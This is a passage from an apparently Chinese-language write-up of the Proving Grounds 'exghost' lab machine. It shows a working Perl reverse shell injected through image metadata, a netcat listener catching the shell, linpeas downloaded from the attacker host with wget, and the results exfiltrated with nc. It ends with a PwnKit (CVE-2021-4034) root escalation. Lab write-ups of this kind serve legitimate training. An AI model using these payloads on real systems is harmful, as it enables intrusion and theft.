</span></span><span class="line"><span class="cl"><span class="o">(</span>metadata <span class="s2">&#34;\c</span><span class="si">${</span><span class="nv">use</span><span class="p"> Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(</span><span class="s1">&#39;tcp&#39;</span><span class="p">));if(connect(S,sockaddr_in(80,inet_aton(</span><span class="s1">&#39;192.168.45.206&#39;</span><span class="p">)))){open(STDIN,</span><span class="s1">&#39;&gt;&amp;S&#39;</span><span class="p">);open(STDOUT,</span><span class="s1">&#39;&gt;&amp;S&#39;</span><span class="p">);open(STDERR,</span><span class="s1">&#39;&gt;&amp;S&#39;</span><span class="p">);exec(</span><span class="s1">&#39;/bin/sh -i&#39;</span><span class="p">);</span><span class="si">}</span><span class="s2">;};};&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="m">1</span> image files updated
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Finished </span></span></code></pre></td></tr></table>
</div>
</div><p>从pcap包中一个有两个HTTP包，除了文件上传接口，还有一个访问根目录的，根据返回包，我们做一个本地的HTML文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Document<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- Part from this tutorial --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://192.168.226.183/exiftest.php&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;myFile&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Upload&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- End of part from this tutorial --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>通过该文件进行文件上传，将我们的恶意图片image.jpg进行上传</p>
<p>成功收到反弹shell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.206<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.226.183<span class="o">]</span> <span class="m">60754</span>
</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
</span></span><span class="line"><span class="cl">$ id <span class="o">&amp;&amp;</span> hostname <span class="o">&amp;&amp;</span>ifconfig
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">exghost
</span></span><span class="line"><span class="cl">ens160: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="m">1500</span>
</span></span><span class="line"><span class="cl">        inet 192.168.226.183  netmask 255.255.255.0  broadcast 192.168.226.255
</span></span><span class="line"><span class="cl">        ether 00:50:56:ba:ea:78  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Ethernet<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">882325</span>  bytes <span class="m">149611956</span> <span class="o">(</span>149.6 MB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">815478</span>  bytes <span class="m">260258150</span> <span class="o">(</span>260.2 MB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class="m">65536</span>
</span></span><span class="line"><span class="cl">        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class="line"><span class="cl">        inet6 ::1  prefixlen <span class="m">128</span>  scopeid 0x10&lt;host&gt;
</span></span><span class="line"><span class="cl">        loop  txqueuelen <span class="m">1000</span>  <span class="o">(</span>Local Loopback<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX packets <span class="m">2114</span>  bytes <span class="m">192120</span> <span class="o">(</span>192.1 KB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        RX errors <span class="m">0</span>  dropped <span class="m">0</span>  overruns <span class="m">0</span>  frame <span class="m">0</span>
</span></span><span class="line"><span class="cl">        TX packets <span class="m">2114</span>  bytes <span class="m">192120</span> <span class="o">(</span>192.1 KB<span class="o">)</span>
</span></span><span class="line"><span class="cl">        TX errors <span class="m">0</span>  dropped <span class="m">0</span> overruns <span class="m">0</span>  carrier <span class="m">0</span>  collisions <span class="m">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ cat /home/hassan/local.txt
</span></span><span class="line"><span class="cl">39b7e7ba6088e8d9070e83de44c7e6e0</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pe" class="heading-element"><span>PE</span>
  <a href="#pe" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>上传文件，信息收集并回传</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@exghost:/tmp$ wget http://192.168.45.206/linpeas.sh
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@exghost:/tmp$ ./linpeas.sh &gt; 1.txt
</span></span><span class="line"><span class="cl">. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
</span></span><span class="line"><span class="cl">./linpeas.sh: 1189: <span class="o">[[</span>: not found
</span></span><span class="line"><span class="cl">./linpeas.sh: 1189: rpm: not found
</span></span><span class="line"><span class="cl">./linpeas.sh: 1189: 0: not found
</span></span><span class="line"><span class="cl">./linpeas.sh: 1199: <span class="o">[[</span>: not found
</span></span><span class="line"><span class="cl">Sorry, try again.
</span></span><span class="line"><span class="cl">./linpeas.sh: 2583: grep -R -B1 <span class="s2">&#34;httpd-php&#34;</span> /etc/apache2 2&gt;/dev/null: not found
</span></span><span class="line"><span class="cl">gpg-connect-agent: no running gpg-agent - starting <span class="s1">&#39;/usr/bin/gpg-agent&#39;</span>
</span></span><span class="line"><span class="cl">gpg-connect-agent: failed to create temporary file <span class="s1">&#39;/var/www/.gnupg/.#lk0x000055c75a8c3cb0.exghost.13020&#39;</span>: No such file or directory
</span></span><span class="line"><span class="cl">gpg-connect-agent: can<span class="s1">&#39;t connect to the agent: No such file or directory
</span></span></span><span class="line"><span class="cl"><span class="s1">gpg-connect-agent: error sending standard options: No agent running
</span></span></span><span class="line"><span class="cl"><span class="s1">www-data@exghost:/tmp$ cp 1.txt /var/www/html/
</span></span></span><span class="line"><span class="cl"><span class="s1">cp: cannot create regular file &#39;</span>/var/www/html/1.txt<span class="err">&#39;</span>: Permission denied
</span></span><span class="line"><span class="cl">www-data@exghost:/tmp$ python3 -m http.server <span class="m">8000</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">Keyboard interrupt received, exiting.
</span></span><span class="line"><span class="cl">www-data@exghost:/tmp$ nc 192.168.45.206 <span class="m">443</span> &lt; 1.txt</span></span></code></pre></td></tr></table>
</div>
</div><p>发现存在CVE-2021-4034</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Vulnerable to CVE-2021-4034</span></span></code></pre></td></tr></table>
</div>
</div><p>使用Pwnkit进行提权</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@exghost:/tmp$ ./PwnKit 
</span></span><span class="line"><span class="cl">root@exghost:/tmp# ls /root/
</span></span><span class="line"><span class="cl">proof.txt  snap
</span></span><span class="line"><span class="cl">root@exghost:/tmp# cat /root/proof.txt 
</span></span><span class="line"><span class="cl">ecbda28237ca915f1edb88a8b8a67826
</span></span><span class="line"><span class="cl">root@exghost:/tmp# </span></span></code></pre></td></tr></table>
</div>
</div><h2 id="sumup" class="heading-element"><span>SumUp</span>
  <a href="#sumup" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>爆破的字典选择很关键，不然会浪费很多时间和精力。</li>
<li>文件上传接口不一定是文件上传</li>
<li>多观察返回包，莫名其妙的提到某个工具，涉及到具体版本号，要多做信息收集和历史漏洞查询</li>
</ul>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="更新于 2023-12-31 07:44:55">更新于 2023-12-31&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div><div class="post-nav"><a href="/posts/provinggrounds-helpdesk/" class="post-nav-item" rel="prev" title="ProvingGrounds HelpDesk Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds HelpDesk Writeup</a><a href="/posts/provinggrouds_surf_writeup/" class="post-nav-item" rel="next" title="ProvingGrouds Surf WriteUp">ProvingGrouds Surf WriteUp<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line visitor">
          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
        </div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
</html>
